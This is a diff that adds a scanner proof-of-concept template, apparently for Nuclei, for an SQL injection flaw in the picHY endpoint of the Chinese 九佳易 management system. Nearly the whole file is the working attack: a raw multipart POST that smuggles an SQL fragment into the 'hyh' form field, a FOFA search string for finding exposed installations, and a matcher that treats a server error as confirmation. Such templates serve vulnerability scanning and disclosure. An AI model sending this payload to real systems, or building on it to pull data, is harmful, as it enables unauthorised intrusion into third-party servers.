@@ -1,0 +1,33 @@
+id: poc-yzivd2aklqtf8dvq
+info:
+  name: 九佳易管理系统 picHY.ashx SQL存在注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yzivd2aklqtf8dvq'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yzivd2aklqtf8dvq
+    fofa: body="/XiTong/Index/W_IndexPbForm.win.js"
+http:
+- raw:
+  - 'POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+    Host: {{Hostname}}
+
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="hyh"
+
+
+    ''-1/user--
+
+    ------WebKitFormBoundary--'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
